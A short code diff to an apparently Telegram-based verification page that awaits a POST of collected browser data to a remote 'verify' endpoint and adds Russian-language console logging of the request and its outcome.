@@ -67,20 +67,23 @@
             languages: navigator.languages.join(',')
         };
 
-        try {
-            fetch('https://verifyr-snhu.onrender.com/verify', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-})
+                try {
+            console.log('Отправка данных на сервер...');
+            const response = await fetch('https://verifyr-snhu.onrender.com/verify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            console.log('Ответ сервера:', response.status);
             loading.classList.add('hidden');
             success.classList.remove('hidden');
             setTimeout(() => tg.close(), 1000);
         } catch (e) {
+            console.error('Ошибка при отправке:', e);
             loading.classList.add('hidden');
             fail.classList.remove('hidden');
         }
     })();
-    </script>
+</script>
 </body>
 </html>
